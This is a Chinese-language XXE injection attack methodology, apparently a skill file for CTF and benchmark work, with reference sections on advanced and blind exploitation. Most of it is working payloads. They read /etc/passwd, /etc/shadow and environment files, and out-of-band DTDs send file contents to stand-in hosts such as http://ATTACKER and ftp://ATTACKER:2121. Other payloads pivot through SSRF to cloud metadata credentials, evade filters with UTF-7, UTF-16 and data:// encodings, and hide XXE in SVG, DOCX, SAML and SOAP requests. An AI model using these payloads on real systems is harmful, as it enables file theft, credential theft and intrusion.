# xxe-injection-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# XXE 注入攻击方法论

## 深入参考

- XXE 文件读取、盲 XXE 外带、SVG/DOCX XXE、SOAP XXE 完整 payload → [references/xxe-exploitation.md](references/xxe-exploitation.md)
- XXE 高级技术（盲注/OOB/文件上传/XInclude/编码绕过） → [references/xxe-advanced.md](references/xxe-advanced.md)

---

## Phase 1: 发现 XXE 入口

- Content-Type: `application/xml` 或 `text/xml` 的端点
- **将 JSON 请求改为 XML**：即使端点接受 JSON，也尝试发 XML（很多后端同时支持两种格式）
- 文件上传（DOCX, XLSX, SVG 都是 XML 格式）
- SOAP API（URL 含 `/ws/`、`/soap/`、`/wsdl/`）

## Phase 2: 基础 XXE 文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**关键**：`&xxe;` 必须放在会被回显的 XML 元素里！

### 常见目标文件

```
file:///flag.txt
file:///flag
file:///app/flag.txt
file:///etc/passwd
file:///app/app.py
file:///proc/self/environ
```

## Phase 3: 利用决策树

```
XXE 入口确认
├─ SOAP 端点？ → XXE 必须嵌入 SOAP Envelope！→ [references/xxe-exploitation.md](references/xxe-exploitation.md)
├─ 有回显？ → 直接 ENTITY file:/// 读文件
├─ 无回显？ → 盲 XXE 参数实体 + 外部 DTD 外带
│  └─ 用 bash 运行 `python3 -m http.server` 或 `nc -lvp PORT` 接收 OOB 回调
│  └─ [references/xxe-exploitation.md](references/xxe-exploitation.md)
├─ PHP 目标？ → php://filter/convert.base64-encode 绕过 XML 特殊字符
└─ 文件上传入口？ → SVG/DOCX XXE → [references/xxe-exploitation.md](references/xxe-exploitation.md)
```

## Phase 4: PHP 特殊技巧

PHP 文件含 `<` 等特殊字符会破坏 XML 解析，使用 php://filter base64 编码绕过：
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/app/config.php">
```

## Phase 5: JSON → XML 转换攻击

有些后端同时支持 JSON 和 XML，解析器自动选择格式：

```
Content-Type: application/xml
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<root><username>&xxe;</username><password>test</password></root>
```

即使文档说 JSON，也尝试 XML Content-Type，可能存在隐式支持。

## XXE 防御绕过

- `<!DOCTYPE>` 被过滤 → 尝试 UTF-16 编码
- `ENTITY` 被过滤 → 尝试参数实体 `%xxe;`
- `SYSTEM` 被过滤 → 尝试 `PUBLIC "x" "file:///flag"`

## 注意事项

- **XXE 本质上包含 SSRF**：`SYSTEM "http://..."` 就是服务端请求
- **XML 解析器差异**：Python lxml 默认禁用外部实体；Java 老版本默认启用
- **盲 XXE 需要外部服务器**：参数实体外带需要你控制一台服务器接收数据

---

## CTF XXE 技巧补充

### DOCX/Office XML 上传 XXE
DOCX 是 ZIP 包含 XML，修改 `[Content_Types].xml` 注入 XXE：
```bash
unzip template.docx
# 编辑 [Content_Types].xml 添加 DOCTYPE + ENTITY
zip -r exploit.docx . 
# 上传后服务端解析 XML 时触发 XXE
```

### XML 注入点扩展
除了常规请求体，检查这些注入点：
- `X-Forwarded-For` 等 Header 被写入 XML 日志时
- SVG 文件上传（SVG 是 XML）
- SOAP/SAML 端点
- RSS/Atom feed 输入


---

## REF: xxe-advanced

# XXE 高级利用技术

## 基于错误的 XXE 数据提取（外部 DTD）

无回显时，通过解析错误将文件内容嵌入错误信息。攻击者托管 `malicious.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Payload：`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd"> %xxe;]>`

## 基于本地 DTD 的错误提取（无外连场景）

禁止出站时，复用系统已有 DTD 文件，重定义其中的参数实体触发错误泄露：

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &apos;file:///nonexistent/&#x25;file;&apos;>">
    &#x25;eval; &#x25;error;
  '>
  %local_dtd;
]>
```

常见系统 DTD：`/usr/share/yelp/dtd/docbookx.dtd`（GNOME）、`/usr/share/xml/fontconfig/fonts.dtd`。用 dtd-finder 扫描可用 DTD。

## XInclude 攻击（无法控制 DOCTYPE 时）

输入仅插入已有 XML 某个元素中时，无法注入 DOCTYPE，改用 XInclude：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## XXE 到 SSRF 链式攻击

`<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`

目标：AWS `169.254.169.254`、GCP `metadata.google.internal`、内网 `127.0.0.1:8080/admin`。

## 文件上传 XXE

### XLSX

```bash
unzip target.xlsx && vim xl/workbook.xml  # 注入 DOCTYPE+ENTITY
zip -r exploit.xlsx .
```

### SVG（文本回显）

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
```

文件内容渲染到图片中，需能访问生成的 SVG 图片。PDF 生成库（wkhtmltopdf 等）解析 XML 时同理可触发。

## SAML 中的 XXE

SAML 断言是 XML，IdP/SP 解析时可触发 XXE。将 DOCTYPE+ENTITY 注入 SAML Response，在 `<saml:Issuer>` 等元素中引用 `&xxe;` 即可。注意保持 SAML namespace 完整。

## 编码绕过技术

### UTF-7

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
```

### UTF-16

```bash
iconv -f UTF-8 -t UTF-16 payload.xml > payload_utf16.xml
```

### data:// 协议 + Base64

```xml
<!DOCTYPE foo [<!ENTITY % x SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %x;]>
```

### HTML 实体编码嵌套

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x3C;&#x21;ENTITY &#x25; dtd SYSTEM &#x22;http://ATTACKER/bypass.dtd&#x22;&#x3E;">
  %a; %dtd;
]>
<data>&exfil;</data>
```

## 解析器行为差异

| 解析器 | 默认外部实体 | 备注 |
|--------|-------------|------|
| libxml2 (Python lxml) | 禁用 | lxml < 5.4.0 即使 `resolve_entities=False` 仍展开参数实体 |
| Java DocumentBuilderFactory | 启用 | 须显式 `disallow-doctype-decl=true` |
| MSXML 3.0 / 6.0 | 3.0 启用，6.0 禁用 | 6.0 需手动设 `ProhibitDTD=true` |
| PHP libxml >= 2.9.0 | 禁用 | 需 `LIBXML_NOENT` 才启用，老版本默认危险 |

### lxml 错误泄露（无需出站）

```xml
<!DOCTYPE foo [
  <!ENTITY % a '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; b "<!ENTITY c SYSTEM &apos;meow://&#x25;file;&apos;>">
  '>
  %a; %b;
]>
<root>&c;</root>
```

解析器尝试 `meow://` 协议失败，错误信息泄露文件内容。

## OOB 外带多行文件（FTP 协议）

HTTP 外带无法获取含换行的内容，FTP 可以：

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER:2121/%file;'>">
%eval;
%exfil;
```

攻击端运行：`ruby xxe-ftp-server.rb 2121`

## Java jar: 协议利用

Java 特有，读取远程 ZIP 内文件时写入 `/tmp/` 临时目录，可配合路径遍历进一步利用：

```xml
<!ENTITY xxe SYSTEM "jar:http://ATTACKER:8080/evil.zip!/payload.dtd">
```


---

## REF: xxe-exploitation

# XXE 深度利用指南

## 基础 XXE 文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**关键**：`&xxe;` 必须放在**会被回显到响应中**的 XML 元素里！

## 常见 flag 路径

```xml
<!ENTITY xxe SYSTEM "file:///flag">
<!ENTITY xxe SYSTEM "file:///flag.txt">
<!ENTITY xxe SYSTEM "file:///FLAG.txt">
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///app/app.py">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
```

## PHP 特殊技巧

PHP 文件含 `<` 等特殊字符会破坏 XML 解析，使用 php://filter base64 编码绕过：
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/app/config.php">
```
响应中得到 base64 编码的文件内容，解码即可。

## 盲 XXE（无直接输出）

使用参数实体 + 外部 DTD 外带数据：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd">%xxe;]>
<root>test</root>
```

evil.dtd 内容：
```xml
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_SERVER/?data=%file;'>">
%eval;
%exfil;
```

**陷阱**：盲 XXE 需要你控制一个外部服务器来接收数据。benchmark 场景中可能没有外部服务器。

## SVG/DOCX 中的 XXE

SVG（常用于头像/图片上传）：
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

DOCX/XLSX：解压后修改 `[Content_Types].xml` 或 `word/document.xml`，加入 XXE payload。

## SOAP Envelope XXE（⛔ SOAP 端点必用此格式！）

当目标是 SOAP/Web Service 端点（URL 含 `/ws/`、`/soap/`、`/wsdl/`，或 Content-Type 为 `text/xml`）：

**⛔ 错误做法**：直接发送裸 DOCTYPE + XML（服务器返回 500 因为不符合 SOAP 格式）

**✅ 正确做法**：将 XXE 嵌入 SOAP Envelope：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <login>
      <username>&xxe;</username>
      <password>anything</password>
    </login>
  </soap:Body>
</soap:Envelope>
```

**Headers 必须设置**：
```
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
```

### SOAP XXE 调试步骤
1. 先发正常 SOAP 请求确认端点正常（200 OK）
2. 在 SOAP Body 的元素中加入 `&xxe;` 实体引用
3. 如果 500 → 检查 SOAP namespace 是否正确
4. 如果实体被忽略 → 尝试放在不同元素中（用户名/密码/参数）

### 非标准 XML API 的 XXE（REST + JSON → XML 转换）
如果 API 默认接受 JSON，尝试改为 XML：
```
Content-Type: application/xml
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<root><username>&xxe;</username><password>test</password></root>
```

## XXE 防御绕过

- 如果 `<!DOCTYPE>` 被过滤 → 尝试 UTF-16 编码
- 如果 `ENTITY` 被过滤 → 尝试参数实体 `%xxe;`
- 如果 `SYSTEM` 被过滤 → 尝试 `PUBLIC "x" "file:///flag"`
